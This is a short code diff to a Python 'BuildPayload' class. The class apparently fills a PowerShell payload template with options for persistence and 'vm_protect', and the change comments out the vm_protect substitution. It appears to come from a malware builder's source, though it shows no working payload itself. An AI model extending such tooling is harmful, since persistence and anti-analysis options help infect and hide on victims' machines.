@@ -66,10 +66,10 @@ class BuildPayload:
                 f"{hashtag}$persistence = $false",
                 f"$persistence=${str(options['persistence']).lower()}",
             )
-            .replace(
-                f"{hashtag}$vm_protect = $false",
-                f"$vm_protect=${str(options['vm_protect']).lower()}",
-            )
+            # .replace(
+            #    f"{hashtag}$vm_protect = $false",
+            #    f"$vm_protect=${str(options['vm_protect']).lower()}",
+            # )
         )
 
         return content
